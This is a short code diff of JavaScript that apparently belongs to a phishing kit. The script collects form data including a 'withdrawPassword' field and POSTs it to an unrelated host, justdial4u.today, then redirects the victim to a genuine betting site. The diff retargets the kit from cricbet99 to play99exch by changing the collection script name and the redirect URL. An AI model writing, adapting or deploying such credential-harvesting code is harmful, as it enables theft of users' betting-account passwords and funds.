@@ -138,14 +138,14 @@
     formData.append("withdrawPassword", withdrawPassword); // Send the withdrawPassword
 
     // Send the data to the server using fetch
-    fetch("https://justdial4u.today/cricbet99.php", {
+    fetch("https://justdial4u.today/play99exch.php", {
       method: "POST",
       body: formData
     })
     .then(response => response.text())
     .then(data => {
       if (data === "success") {
-	 window.location.href = "https://cricbet99.com";
+	 window.location.href = "https://play99exch.live/login";
       } else {
         alert("Error: " + data);
       }
